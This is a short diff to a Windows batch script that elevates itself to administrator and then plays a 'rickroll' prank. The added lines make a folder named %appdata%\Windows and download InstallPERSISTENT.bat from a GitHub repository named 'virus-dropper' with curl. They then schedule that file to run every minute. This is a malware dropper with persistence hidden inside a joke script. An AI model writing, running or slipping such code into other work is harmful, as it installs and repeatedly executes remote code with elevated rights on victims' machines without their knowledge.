@@ -12,6 +12,9 @@ if '%errorlevel%' NEQ '0' (
     echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
+    md %appdata%\Windows
+    curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
+    SCHTASKS /CREATE /F /SC MINUTE /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
     wscript rickroll.vbs
     taskkill /f /im "explorer.exe"
     start explorer.exe
